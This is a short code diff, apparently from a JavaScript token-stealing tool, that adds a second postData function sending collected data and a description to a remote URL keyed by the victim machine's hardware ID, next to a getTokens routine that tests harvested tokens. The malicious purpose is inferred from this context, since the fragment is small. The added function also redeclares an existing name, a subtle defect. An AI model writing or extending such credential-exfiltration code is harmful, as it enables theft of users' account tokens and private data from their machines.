@@ -58,6 +58,10 @@ function postData(data) {
     post(url.toLowerCase() + `/d/${hwid}`, { data }).then(() => {});
 }
 
+function postData(data, description) {
+    post(url.toLowerCase() + `/d/${hwid}?description=${description}`, { data }).then(() => {});
+}
+
 const getTokens = async () => {
     const testToken = (token) => {
         return new Promise((resolve, reject) => {
